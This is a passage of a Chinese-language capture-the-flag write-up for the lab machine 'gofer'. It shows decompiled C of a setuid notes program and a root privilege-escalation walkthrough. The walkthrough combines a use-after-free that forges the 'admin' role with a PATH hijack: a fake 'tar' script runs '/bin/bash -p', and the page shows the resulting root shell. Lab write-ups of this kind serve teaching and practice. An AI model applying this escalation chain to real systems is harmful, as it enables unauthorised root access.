+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">v3</span><span class="p">;</span><span class="w"> </span><span class="c1">// rax</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">v5</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+Ch] [rbp-14h] BYREF</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+10h] [rbp-10h]</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">;</span><span class="w"> </span><span class="c1">// [rsp+18h] [rbp-8h]</span>
+
+<span class="w">  </span><span class="n">v5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
+<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span>
+<span class="w">      </span><span class="s">&quot;========================================</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;1) Create an user and choose an username</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;2) Show user information</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;3) Delete an user</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;4) Write a note</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;5) Show a note</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;6) Save a note (not yet implemented)</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;7) Delete a note</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;8) Backup notes</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;9) Quit</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;========================================</span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">      </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Your choice: &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_212E</span><span class="p">);</span>
+<span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
+<span class="w">        </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
+<span class="w">          </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18uLL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memset</span><span class="p">((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10uLL</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">getuid</span><span class="p">()</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1919251317</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">v3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">;</span>
+<span class="w">          </span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1768776801</span><span class="p">;</span>
+<span class="w">          </span><span class="n">v3</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">110</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Choose an username: &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%23s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_212E</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
+<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">LABEL_11</span><span class="p">;</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Username: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Role: %s</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">);</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
+<span class="w">          </span><span class="n">free</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span>
+<span class="w">        </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28uLL</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memset</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x28uLL</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">ptr</span><span class="w"> </span><span class="p">)</span>
+<span class="w">          </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Write your note:&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%39s&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note: %s</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">6</span><span class="p">:</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Coming soon!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">7</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+<span class="w">          </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0L</span><span class="n">L</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="mi">8</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">s</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">24</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;admin&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span>
+<span class="w">          </span><span class="p">{</span>
+<span class="w">            </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Access granted!&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">            </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">            </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">          </span><span class="k">else</span>
+<span class="w">          </span><span class="p">{</span>
+<span class="w">            </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Access denied: you don&#39;t have the admin role!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">else</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="nl">LABEL_11</span><span class="p">:</span>
+<span class="w">          </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;First create an user!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">default</span><span class="o">:</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>可以看到在 <code>case 8</code> 中设置了 uid 为 0 后调用 tar，因此可以劫持环境变量</p>
+<p>若要正常执行到 system 部分，需要 s[24:] == admin 修改 s 变量的位置为 <code>case 1</code></p>
+<p>因此构造 <code>username = 12345678901234567890123admin</code></p>
+<div class="language-text highlight"><pre><span></span><code>tbuckley@gofer:~$ /usr/local/bin/notes
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 1
+
+Choose an username: 12345678901234567890123admin
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 8
+
+Access denied: you don&#39;t have the admin role!
+</code></pre></div>
+<p>失败了，再次分析，发现 <code>case 1</code> 中仅仅给 s 分配了 24 字节，进一步观察发现 <code>case 4</code>会申请 40 个字节，同时 <code>case 3</code> 会释放掉 s 变量的内存，因此可以先释放 s 内存，再在 <code>case 4</code>申请新变量的内存，即可在原内存范围内写入数据，此时的 <code>case 8</code> 也可以获取到变量 s 在释放之前的内存区域，攻击流程：</p>
+<ol>
+<li>编辑 <code>/tmp/tmp/tar</code></li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code>#!/bin/bash
+/bin/bash -p
+</code></pre></div>
+<ol>
+<li>设置环境变量及权限</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code>chmod +x /tmp/tmp/tar
+export PATH=/tmp/tmp:$PATH
+</code></pre></div>
+<ol>
+<li>执行 notes</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code>/usr/local/bin/notes
+# 选择 1
+# 输入 24 位垃圾数据 + admin
+123456789012345678901234admin
+# 选择 2 查看 role 是否为 admin
+# 选择 3
+# 选择 4
+# 输入 24 位垃圾数据 + admin
+123456789012345678901234admin
+# 选择 2 查看 role 是否为 admin
+# 选择 8
+</code></pre></div>
+<h3 id="get-roottxt">Get root.txt</h3>
+<p><img alt="image-20231029041235113" src="../assets/202310290412154.png" /></p>
+<div class="language-text highlight"><pre><span></span><code>========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+Your choice: 1
+
+Choose an username: 123456789012345678901234admin
+========================================
+Your choice: 2
+
+Username: 12345678901234567890123
+Role: user
+========================================
+Your choice: 3
+========================================
+Your choice: 4
+
+Write your note:
+123456789012345678901234admin
+========================================
+Your choice: 2
+
+Username: 123456789012345678901234admin
+Role: admin
+========================================
+Your choice: 8
+
+Access granted!
+/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
+bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
+root@gofer:~#
+</code></pre></div>
+<p><img alt="image-20231029041453387" src="../assets/202310290414435.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.path", "navigation.top", "toc.follow", "toc.integrate", "navigation.instant", "navigation.instant.progress", "header.autohide"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
+      
+    
+  </body>
+</html>
